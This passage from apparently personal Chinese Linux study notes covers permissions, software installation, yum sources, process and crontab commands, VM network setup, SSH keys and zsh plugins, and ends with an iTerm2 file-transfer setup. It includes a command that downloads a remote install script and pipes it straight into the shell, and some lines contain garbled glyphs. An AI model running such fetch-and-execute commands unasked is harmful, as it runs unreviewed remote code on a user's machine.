]则是文件； 若是[ l ]则表示为链接文档(link file)； 若是[ b ]则表示为装置文件里面的可供储存的接口设备(可随机存取装置)； 若是[ c ]则表示为装置文件里面的串行端口设备，例如键盘、鼠标(一次性读取装置); r、w、x 对于文件和目录的含义 权限 对文件的含义 对目录的含义 r 读权限 可以查看文件内容 可以列出目录中的内容 w 写权限 可以修改文件内容 可以再目录中创建、删除文件 x 执行权限 可以执行文件 可以进入目录 4. 软件安装 TODO1. 二进制发布包安装 TODO:软件已经针对具体平台编译打包发布，只要解压，修改配置即可 安装jdk , 安装tomcat也一样 TODO: 通过 ftp工具把 jdk传到 linux服务器 创建一个 /var/www/html/soft/jdk8 的软链接, 指向服务器中的安装包 —— 这一步失败了, 先搁置把, 先copy过去. 2. 源码编译安装 TODO:软件以源码工程的形式发布，需要获取到源码工程后用相应开发工具进行编译打包部署 安装/卸载 redis 卸载: 首先查看redis-server是否启动 ps aux | grep redis 有的话, 关闭这些进程 kill -9 进程pid 删除redis相应的文件夹就可以了。 find / -name redis 安装: 拷贝到/usr/local, 解压, 删掉原安装包 12tar -zxvf redis-3.0.0.tar.gz rm redis-3.0.0.tar.gz 检查运行环境 123# 检测一下是否可以安装makemake test 安装到指定目录 1make PREFIX=/root/apps/redis install 拷贝配置信息 1cp /usr/local/redis-3.0.0/redis.conf /usr/local/redis/bin 启动 前端模式 bin/redis-server 后端模式启动 修改redis.conf配置文件，daemonize yes` 以后端模式启动 : TODO 3. RPM发布包软件已经按照RedHat（Redhat Package Manager）的包管理工具规范RPM进行打包发布，需要获取到相应的软件RPM发布包，然后用rpm命令进行安装 Mysql安装 1234567891011121314151617181920# rpm安装命令1、安装包：rpm -ivh 包名参数：-i ：安装的意思-v ：可视化-h ：显示安装进度另外在安装一个rpm包时常用的附带参数有：--force 强制安装，即使覆盖属于其他包的文件也要安装--nodeps 当要安装的rpm包依赖其他包时，即使其他包没有安装，也要安装这个包2、升级包：rpm -Uvh filename-U 升级3、卸载包rpm -e filename （这里的filename是通过rpm的查询功能所查询到的）4、查询一个包是否安装：rpm -q 包名（这里的包名，是不带有平台信息以及后缀名的）5.查询当前安装的所有rpm包：rpm -qa查询当前安装的和sql相关的包：rpm -qa | grep 'sql'查询sqlite安装路径：rpm -ql sqlite 5. 设置本地/网络yum源 首先检查虚拟机的 CD/DVD驱动器是否有挂载iso镜像文件 找到挂载源的位置 在 /dev/sr0下, 将其挂载到/mnt下创建的cdrom文件夹下 mount -t iso9660 -o ro /dev/sr0 /media/cdrom 配置开机挂载 , vi /etc/fstab, 增加一行 /dev/cdrom /media/cdrom iso9660 defaults 0 0 创建软连接, 设置可以通过web访问 ln -s /mnt/cdrom/ /var/www/html/yumsorurce 修改etc/yum.repos.d中的文件entOS-Media.repo中的enabled=1, 开启从本地寻找, 因为文件中, 原本就配置了baseurl: file:///media/cdrom/, 而我们自己创建了media/cdrom这个目录, 所以就可以从这里面读取了 执行yum repolist, 发现已经能读取出media中的repo了, 大功告成 c6-media CentOS-6 - Media 6,575 tips: 个人觉得还是配置个网络源比较好, 比如163/阿里的. 12345678910111213141516171819# 操作步骤# 1.备份原来的Base源cd /etc/yum.repos.d/mv CentOS-Base.repo CentOS-Base.repo_bak# 2. 下载网易/阿里源 到/etc/yum.repos.d下, 替换掉原本的# 网易源wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.163.com/.help/CentOS6-Base-163.repo# 阿里源wget -O /etc/yum.repos.d/CentOS-Base.repo http://mirrors.aliyun.com/repo/Centos-6.repoyum clean allyum makecache# yum使用yum update 􏻦􏻧􏷉􏷊升级系统yum install -y xxx 直接安装, 不用确认􏻈yum update ~ 􏻦􏻧􏸻􏹺􏷜 升级指定软件包yum remove ~ 􏺌􏷎􏸻􏹺􏷜􏷕 卸载指定软件 挂载, 配置源的其他说明 12345678910111213141516171819202122232425# 关于挂载# lrwxrwxrwx. 1 root root 3 5月 25 16:47 cdrom -&gt; sr0cdrom其实是sr0的软链接, 因此直接找sr0即可# 挂载的基本语法mont -t iso9660 -o ro(只读) /dev/sr0 /mnt/cdrom (挂载类型) (挂载方式) (挂载源) (挂载点)# 卸载的语法umount /mnt/cdrom 如果卸载时遇到 umount: /mnt/cdrom: device is busy.解决方式: 1. 查找哪个进程在用: fuser /mnt/cdrom 2. 查找进程: ps -ef | grep 进程号 3. 插死进程: kill -9 进程号, 如果是root用户, 可能会断开连接, 需要重连 4. 然后继续 umount, 如果不行, 就强制卸载 umount -f /mnt/cdrom# 关于etc/yum.repos.d 中文件的说明 CentOS-Base.repo：有网的环境下默认使用这个，这个是第一优先级。因为没网，所以修改文件名，设置成备份文件。这样系统就会使用第二优先级的文件。 CentOS-Media.repo：没网的环境下使用这个，在上图中会发现他默认配置了4个路径，第4个yumsource是我自己加的。意思是说，如果系统检测yum使用了离线安装，那么会从上到下从这4个路径中查找安装软件。所以我们只要把光盘挂载在这四个目录下的任意一个目录即可。同时，该配置文件默认是不启用的，如果想使用需要修改倒数第二行的enabled为1，否则该文件无效。 # /mnt &amp; /media 目录的区别media：挂载一些移动设备，例如光盘，U盘等。mnt： 挂载一些硬盘等设备。所以我们的光盘应该挂载在media目录下，从yum给的默认配置文件也能看出。 6. 进程相关1. ps命令ps命令用于报告当前系统的进程状态。可以搭配kill指令随时中断、删除不必要的程序。 常用选项包括： 123456ps -1、-a显示所有用户的进程2、-u显示用户名和启动时间3、-x显示所有进程，包括没有控制终端的进程4、-e显示所有进程，包括没有控制终端的进程，较x选项，信息更为简略5、-l显示进程详细信息，按长格式显示 常用组合 ps -au 显示所有用户进程，并给出用户名和启动时间等详细信息 ps -aux 显示所有用户进程，包括没有控制终端的进程，并给出用户和和启动埋单等详细信息 ps -el 按长格式显示进程详细信息 1234567891011121314151617181920212223242526272829303132# 上述命令可能出现的字段含义USER: 进程所有者PID: 进程号PPID: 进程的父进程ID%CPU: CPU占用率C: 进程的CPU占用率%MEM: 内存占用率VSZ: 表示如果一个程序完全驻留在内存的话需要占用多少内存空间;RSS: 指明了当前实际占用了多少内存;TTY: 终端的次要装置号码 (minor device number of tty)F：进程的标志S：进程的状态STAT: 该进程程的状态，有以下值D: 不可中断的静止R: 正在执行中S: 静止状态T: 暂停执行Z: 不存在但暂时无法消除W: 没有足够的记忆体分页可分配&lt;: 高优先序的进程N: 低优先序的进程L: 有记忆体分页分配并锁在记忆体内PRI：进程的优先权NI：进程的Nice值ADDR：进程的地址空间SZ：进程占用内存的大小WCHAN：进程当前是否在运行TTY：进程所属终端START: 进程开始时间TIME: 执行的运行时间COMMAND：所执行的指令CMD：进程的命令 2. kill / pidof / pkill 命令有时候某个进程可能会长期占用CPU资源或无法正常执行或超出运行时间等，此时可能希望人工干预直接将进程杀死，这时候kill命令可以派上用场 12341、kill pid 直接杀死进程，但不能保证一定能杀死2、kill -9 pid 强制杀死进程3、pidof命令用于查看某个进程的进程号（例如：pidof mysqld）4、pkill命令可以按照进程名杀死进程。pkill和killall应用方法差不多，也是直接杀死运行中的程序；如果您想杀掉单个进程，请用kill来杀掉 3. 进程切换前台进程指的是进程在执行时会将命令行阻塞，直到进程执行完毕；后台进程指的是进程在执行时不会阻塞当前命令行，而是在系统后台执行 123451、ctrl + c 终止进程2、ctrl + z 挂起进程3、fg命令将进程转换到前台执行4、bg命令将进程转换到后台执行5、jobs命令查看任务 4. top命令top 命令可以定期显示所有正在运行和实际运行并且更新到列表中，它显示出 CPU 的使用、内存的使用、交换内存、缓存大小、缓冲区大小、过程控制、用户和更多命令。它也会显示内存和 CPU 使用率过高的正在运行的进程。 按q键退出查看. 5. pstree命令将进程间的关系以树结构的形式展示，能清楚看各进程之间的父子关系 12pstree ：以树状形式显示进程pstree -p ： 以树状形式显示进程，并且显示进程号 6. JPS命令JPS命令是JDK提供的一个检查系统是否启动了JVM进程的一个进程。不是linux系统自带的。主要任务就是用来检查java进程的。 7. 计划任务概念计划任务在Linux的体现主要分为at和crontab，其中： at：通过at命令安排任务在某一时刻执行一次 crontab：通过crontab 命令，我们可以在固定的间隔时间执行指定的系统指令或 shell script脚本。时间间隔的单位可以是分钟、小时、日、月、周及以上的任意组合。这个命令非常适合周期性的日志分析或数据备份等工作。 命令服务管理crontab在CentOS系统上，crontab服务的名称叫做crond 安装 yum -y install crontabs 服务操作说明 1234567891011service crond start #启动服务service crond stop #关闭服务service crond restart #重启服务service crond reload #重新载入配置service crond status #服务状态#查看crontab服务是否已设置为开机启动，执行命令：chkconfig --list#加入开机自动启动：chkconfig --level 35 crond on crontab功能使用 命令格式 123456789101112131415161718192021222324252627282930313233crontab [-u user] filecrontab [-u user] [ -e | -l | -r ]# crontab 参数说明：-u user：用来设定某个用户的crontab服务，例如，”-u ixdba”表示设定ixdba用户的crontab服务，此参数一般有root用户来运行。file：file是命令文件的名字,表示将file做为crontab的任务列表文件并载入crontab。-e：编辑某个用户的crontab文件内容。如果不指定用户，则表示编辑当前用户的crontab文件。-l：显示某个用户的crontab文件内容，如果不指定用户，则表示显示当前用户的crontab文件内容。-r：删除定时任务配置，从/var/spool/cron目录中删除某个用户的crontab文件，如果不指定用户，则默认删除当前用户的crontab文件。-i：在删除用户的crontab文件时给确认提示。# 命令示例：crontab file [-u user] ## 用指定的文件替代目前的crontab。 # 必须掌握：crontab -l [-u user] ## 列出用户目前的crontab. crontab -e [-u user] ## 编辑用户目前的crontab.# 通过crontab添加的计划任务都会存储在/var/spool/cron/目录里# 查看当前服务状态service crond status# 操作服务/sbin/service crond start //启动服务/sbin/service crond stop //关闭服务/sbin/service crond restart //重启服务/sbin/service crond reload //重新载入配置# 查看开机启动服务ntsysv # 退出时, 按tab切换# 加入开机自动启动chkconfig –level 35 crond on 配置说明 123456789101112131415161718# 基本格式 : * * * * * command 分 时 日 月 周 命令 # 每个小时的第几分钟执行该任务. 其它的类似第1列表示分钟1～59 每分钟用*或者 */1表示 第2列表示小时0～23（0表示0点） 7-9表示：8点到10点之间第3列表示日期1～31 第4列表示月份1～12 第5列标识号星期0～6（0表示星期天） 第6列要运行的命令# 记住几个特殊符号的含义:“*”代表取值范围内的数字,“/”代表”每”,“-”代表从某个数字到某个数字,“,”分开几个离散的数字 配置示例 123456789101112131415161718192021222324252627282930313233# * * * * * command # 分 时 日 月 周 命令 */1 * * * * date &gt;&gt; /root/date.txt上面的例子表示每分钟执行一次date命令可用 tail -f查看30 21 * * * /usr/local/etc/rc.d/httpd restart上面的例子表示每晚的21:30重启apache45 4 1,10,22 * * /usr/local/etc/rc.d/httpd restart上面的例子表示每月1、10、22日的4 : 45重启apache10 1 * * 6,0 /usr/local/etc/rc.d/httpd restart 上面的例子表示每周六、周日的1 : 10重启apache0,30 18-23 * * * /usr/local/etc/rc.d/httpd restart上面的例子表示在每天18 : 00至23 : 00之间每隔30分钟重启apache0 23 * * 6 /usr/local/etc/rc.d/httpd restart上面的例子表示每星期六的11 : 00 pm重启apache* */1 * * * /usr/local/etc/rc.d/httpd restart上面的例子每一小时重启apache* 23-7/1 * * * /usr/local/etc/rc.d/httpd restart上面的例子晚上11点到早上7点之间，每隔一小时重启apache0 11 4 * mon-wed /usr/local/etc/rc.d/httpd restart上面的例子每月的4号与每周一到周三的11点重启apache0 4 1 jan * /usr/local/etc/rc.d/httpd restart 上面的例子一月一号的4点重启apache 更详细的见这里 8. Linux虚拟主机集群测试环境基本搭建 注意点: 首次使用 NAT 模式装好CentOS之后, 使用ifconfig查看ip, 虚拟机是没有ip的, 需要手动开启ip服务, 命令是 dhclient, 如果已开启就不能再次开启 1. 第一台虚拟主机的静态ip配置(针对于mac环境) 执行ifconfig命令, 如下 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667shixuanji@x:~|⇒ ifconfiglo0: flags=8049&lt;UP,LOOPBACK,RUNNING,MULTICAST&gt; mtu 16384 options=1203&lt;RXCSUM,TXCSUM,TXSTATUS,SW_TIMESTAMP&gt; inet 127.0.0.1 netmask 0xff000000 inet6 ::1 prefixlen 128 inet6 fe80::1%lo0 prefixlen 64 scopeid 0x1 nd6 options=201&lt;PERFORMNUD,DAD&gt;gif0: flags=8010&lt;POINTOPOINT,MULTICAST&gt; mtu 1280stf0: flags=0&lt;&gt; mtu 1280EHC29: flags=0&lt;&gt; mtu 0EHC26: flags=0&lt;&gt; mtu 0XHC20: flags=0&lt;&gt; mtu 0en0: flags=8823&lt;UP,BROADCAST,SMART,SIMPLEX,MULTICAST&gt; mtu 1500 ether 60:03:08:a1:ac:ee nd6 options=201&lt;PERFORMNUD,DAD&gt; media: autoselect (&lt;unknown type&gt;) status: inactivep2p0: flags=8802&lt;BROADCAST,SIMPLEX,MULTICAST&gt; mtu 2304 ether 02:03:08:a1:ac:ee media: autoselect status: inactiveawdl0: flags=8902&lt;BROADCAST,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1484 ether 72:25:b2:c8:2a:03 nd6 options=201&lt;PERFORMNUD,DAD&gt; media: autoselect status: inactiveen1: flags=8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500 options=60&lt;TSO4,TSO6&gt; ether 32:00:1a:0d:12:00 media: autoselect &lt;full-duplex&gt; status: inactiveen2: flags=8963&lt;UP,BROADCAST,SMART,RUNNING,PROMISC,SIMPLEX,MULTICAST&gt; mtu 1500 options=60&lt;TSO4,TSO6&gt; ether 32:00:1a:0d:12:01 media: autoselect &lt;full-duplex&gt; status: inactivebridge0: flags=8822&lt;BROADCAST,SMART,SIMPLEX,MULTICAST&gt; mtu 1500 options=63&lt;RXCSUM,TXCSUM,TSO4,TSO6&gt; ether 32:00:1a:0d:12:00 Configuration: id 0:0:0:0:0:0 priority 0 hellotime 0 fwddelay 0 maxage 0 holdcnt 0 proto stp maxaddr 100 timeout 1200 root id 0:0:0:0:0:0 priority 0 ifcost 0 port 0 ipfilter disabled flags 0x2 member: en1 flags=3&lt;LEARNING,DISCOVER&gt; ifmaxaddr 0 port 10 priority 0 path cost 0 member: en2 flags=3&lt;LEARNING,DISCOVER&gt; ifmaxaddr 0 port 11 priority 0 path cost 0 media: &lt;unknown type&gt; status: inactiveutun0: flags=8051&lt;UP,POINTOPOINT,RUNNING,MULTICAST&gt; mtu 2000 inet6 fe80::2ed8:c28:27b2:f5d2%utun0 prefixlen 64 scopeid 0xd nd6 options=201&lt;PERFORMNUD,DAD&gt;vmnet1: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500 ether 00:50:56:c0:00:01 inet 172.16.63.1 netmask 0xffffff00 broadcast 172.16.63.255vmnet8: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500 ether 00:50:56:c0:00:08 inet 192.168.170.1 netmask 0xffffff00 broadcast 192.168.170.255en4: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500 options=3&lt;RXCSUM,TXCSUM&gt; ether 00:0e:c6:cc:ae:d7 inet6 fe80::1c60:7fe2:3947:4ec0%en4 prefixlen 64 secured scopeid 0x11 inet 192.168.63.148 netmask 0xffffff00 broadcast 192.168.63.255 nd6 options=201&lt;PERFORMNUD,DAD&gt; media: autoselect (100baseTX &lt;full-duplex,flow-control&gt;) status: active 找到最后的vmnet8, 其中的 inet 就是虚拟主机的网段, 配置虚拟主机的静态ip的时候, 就配置此网段内的. 广播地址 broadcast也是虚拟主机NAT的广播地址, 配置时可以不填 123vmnet8: flags=8863&lt;UP,BROADCAST,SMART,RUNNING,SIMPLEX,MULTICAST&gt; mtu 1500 ether 00:50:56:c0:00:08 inet 192.168.170.1 netmask 0xffffff00 broadcast 192.168.170.255 修改虚拟机网卡配置vi /etc/sysconfig/network-scripts/ifcfg-eth0, 做如下配置 123456789101112DEVICE=eth0HWADDR=00:0C:29:D6:C7:0ETYPE=EthernetUUID=bebc1b63-4f20-405a-860a-32d0d8211582ONBOOT=yesNM_CONTROLLED=yesBOOTPROTO=static # ip类型IPADDR=192.168.170.6 # ip地址, 与 vmnet8 在同一网段NETMASK=255.255.255.0 # 子网掩码GATEWAY=192.168.170.2 # 网关, 跟 ip在同一网段DNS1=192.168.170.2 # 与 ip 同一网段 DNS2=8.8.8.8 # google的 dns 重启网络服务(这里重启也没啥用，等后面hostname改完了，重启一下) service network restart 2. 复制原本的虚拟主机 复制虚拟主机1到2 按照原虚拟主机的root用户名&amp;密码登录2 3. 修改新机网卡 修改网卡vi /etc/udev/rules.d/70-persistent-net.rules, 删除eth0所在的整个段落, 把下面的eth1改为eth0, 保存退出 修改网卡配置vi /etc/sysconfig/network-scripts/ifcfg-eth0, 如果有UUID, HARDDR, 删掉, IPADDR改为与原虚拟主机不同的地址, 但要在同一网段, BOOTPROTO改为static4. 修改新机hostname ​ 修改hostname, vi /etc/sysconfig/network, 把HOSTNAME改为要修改的名字 5.到这里配置完了，重启一下reboot 6. SSH免密登录原理 注意点：如果遇到需要添加新机器之类的，最好是先把 .ssh文件删掉，然后所有的机器一起操作看，全部都重新生成ssh-keygen， 全部重新发送 ssh-copy-id ，这样最简单，不易出错 在mac端，传ssh-copy-id时候，要制定用户名 ssh-copy-id ap@cs1；类似这样 新机生成自己公钥 ssh-keygen, 注意: 如果原本主机中已经生成, 此处在提示verwrite (y/n)?的时候要选择y, 才会重新生成覆盖 把新主机公钥发送给其它机器 ssh-copy-id root@xxx(其它主机ip), 此命令相当于 下面2条命令的效果 12cat id_rsa.pub &gt; authorized_keysscp -r authorized_keys root@192.168.123.202:/root/.ssh/ 其他主机也把公钥发给新主机, 此时就可以实现主机间的免密登录了. 7. 功能增强(可选) 可以在 每台机器中设置host别名, vi /etc/hosts, 加上xxx.xxx.xx.xxx cts1/2/3..., 这样在访问其他主机时, 可以直接用别名替代域名 如果是用的zsh的shell, 可以在所有主机的 &lt;sub&gt;.zshrc中, 添加alias login1=&#39;ssh root@cts1&#39; &gt;&gt; &lt;/sub&gt;/.zshrc, 这样可以直接 用 login1登录到对应的主机. 9. 安装, 使用 zsh &amp; oh-my-zsh &amp;相关插件主骨架安装&amp;介绍 安装zsh套件 1yum install zsh -y 安装 oh-my-zsh套件 1sh -c "$(wget https://raw.github.com/robbyrussell/oh-my-zsh/master/tools/install.sh -O -)" zsh 的一些基本配置操作, 常用插件安装见这里! 12345678910111213141516171819202122# 查看oh-my-zsh 的主题ls ~/.oh-my-zsh/themes------#这里都是 .zshrc中的配置------# 可以更改为random, 这样会随机显示, 很有乐趣, 直接输入zsh也会切换vi ~/.zshrcZSH_THEME="random"# 添加plugin, 按照对应方式安装plugins=(git ... ... )# 添加alias 到 ~/.zshrcalias vi='vim'alias zshconfig='vi ~/.zshrc'alias vimconfig='vi ~/.vimrc'-----------------------# 设置当前用户使用zsh为默认的shellchsh -s /bin/zsh# 卸载 oh-my-zshuninstall_oh_my_zsh zsh zsh 的一些骚气操作 12345671. 兼容 bash, 这个就不用说了2. 输入某条命令, 比如 cat, 然后用上下键, 可以翻阅所有执行过的命令3. 各种补全, 输入任何命令, 按 2下 tab键, 下面会出现所有可能的补全, 可以 tab, 或 上下左右切换.4. 比如要杀掉进程java, 原来是需要 ps aux | grep java, 查进程的 PID，然后 kill PID; 现在只需要 kill java, 然后按下 tab, java会被替换为 对应的 PID, 点回车, kill !5. 目录浏览和跳转, 输入 d, 可以列出在这个回话中访问过的目录列表, 再输入列表前的序号, 即可直接跳转.6. 在当前目录下输入 .. 或 ... , 或者直接输入目录名, 都可以直接跳转, 甚至都不需要使用 cd命令了.7. 通配符搜索：ls -l */.sh，可以递归显示当前目录下的 shell 文件，文件少时可以代替 find，文件太多就歇菜了. zsh主题介绍, zsh插件介绍 zsh常用插件安装安装 zsh-autosuggestions1234567891011121314151617181920方式1: # 下载到本地git clone git://github.com/zsh-users/zsh-autosuggestions ~/.zsh/zsh-autosuggestions# 添加到.zshrc, 这样就不用每次source了添加 source ~/.zsh/zsh-autosuggestions/zsh-autosuggestions.zsh 到 .zshrc 尾部plugins=() 中添加上 zsh-autosuggestions, 用空格隔开即可======================方式2: 官方建议# 少了添加source到 ~/.zshrc这一步, 猜想是会按照默认的路径加载? ==&gt; 是的, 是可行的, 建议这个# 猜想, oh-my-zsh会自动对安装到 &lt;sub&gt;/.oh-my-zsh/custom&#125;/plugins/ 此路径下的插件source, 就不需要手动在 &lt;/sub&gt;/.zshrc中添加source了, 其它的插件就先不折腾了, 以后有机会再试试# 1.Clone this repository into $ZSH_CUSTOM/plugins (by default ~/.oh-my-zsh/custom/plugins)git clone https://github.com/zsh-users/zsh-autosuggestions $&#123;ZSH_CUSTOM:-~/.oh-my-zsh/custom&#125;/plugins/zsh-autosuggestions# 2.Add the plugin to the list of plugins for Oh My Zsh to load:plugins=(zsh-autosuggestions)# 3.Start a new terminal session. 安装 autojump123456789101112131415161718# 下载到本地git clone git://github.com/joelthelion/autojump.git# 执行安装脚本cd autojump./install.py# 安装完成在~/下面有.autojump目录, 在.zshrc中加一句[[ -s &lt;sub&gt;/.autojump/etc/profile.d/autojump.sh ]] &amp;&amp; . &lt;/sub&gt;/.autojump/etc/profile.d/autojump.sh# 在plugins=(git zsh-autosuggestions autojump) 加上autojump, 与前者用空格隔开PS: 添加一条快捷键：j -a s '/Users/XXX/Desktop/code/shark’这句代码的含义：j -a 你定义的快捷命令 ‘需要跳转的目录位置’此后要是想进入shark目录，除了传统的cd一级一级的进入，还可以直接使用命令：j s # 接下来可以愉悦的使用 j 了 安装 zsh-syntax-highlighting 123456789101112131415# 到 ~/.zshrc 目录, 克隆仓库# 这里默认的是主目录, 当然可以下载到其它目录# ps: 在那个目录, git clone就会下载到哪个目录git clone https://github.com/zsh-users/zsh-syntax-highlighting.git# source the script 到 ~/.zshrc# 这个在哪个目录下echo的, 就会把当前目录拼到前面?? 结果好像是这样echo "source $&#123;(q-)PWD&#125;/zsh-syntax-highlighting/zsh-syntax-highlighting.zsh" &gt;&gt; $&#123;ZDOTDIR:-$HOME&#125;/.zshrc# 在plugins=(git zsh-autosuggestions autojump zsh-syntax-highlighting) zsh-syntax-highlighting, 与前者用空格隔开# 其实这里不加好像也没事, 还是加上为好# 在当前 shell生效# 看这个文件在哪个目录, 在哪个目录就source 哪个目录, 立即生效source ./zsh-syntax-highlighting/zsh-syntax-highlighting.zsh]]></content>
      <categories>
        <category>Linux</category>
        <category>学习笔记</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>Linux</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[iTerm2上使用 lrzsz黑科技 上传下载文件到远端]]></title>
    <url>%2F2018%2F05%2F23%2FTools%2FiTerm2%2FiTerm2%E4%B8%8A%E4%BD%BF%E7%94%A8lrzsz%E4%B8%8A%E4%BC%A0%E4%B8%8B%E8%BD%BD%E6%96%87%E4%BB%B6%2F</url>
    <content type="text"><![CDATA[ZModem integration for iTerm 2This script can be used to automate ZModem transfers from your OSX desktop to a server that can run lrzsz (in theory, any machinethat supports SSH), and vice-versa. The minimum supported iTerm2 version is 1.0.0.20120108 Troubleshooting Sending a directory may fail: this is a known issue If you are using tmux or some other terminal multiplexer (ie: screen), try using the -e option to sz and/or rz on your server to force escaping of more characters during transmission. This tool may also fail if you are using expect or rlogin as it expects a mostly-clean 8-bit connection between the two parties. Setup Install lrzsz on OSX: brew install lrzsz Save the iterm2-send-zmodem.sh and iterm2-recv-zmodem.sh scripts in /usr/local/bin/ Set up Triggers in iTerm 2 like so: Regular expression: rz waiting to receive.\*\*B0100 Action: Run Silent Coprocess Parameters: /usr/local/bin/iterm2-send-zmodem.sh Instant: checked Regular expression: \*\*B00000000000000 Action: Run Silent Coprocess Parameters: /usr/local/bin/iterm2-recv-zmodem.sh Instant: checked To send a file to a remote machine: Type rz on the remote machine Select the file(s) on the local machine to send Wait for the coprocess indicator to disappear The receive a file from a remote machine Type sz filename1 filename2 … filenameN on the remote machine Select the folder to receive to on the local machine Wait for the coprocess indicator to disappear Future plans (patches welcome) Visual progress bar indicator]]></content>
      <categories>
        <category>工具</category>
        <category>iTerm2</category>
      </categories>
      <tags>
        <tag>原创</tag>
        <tag>技术</tag>
        <tag>工具</tag>
        <tag>iTerm2</tag>
      </tags>
  </entry>
</search>
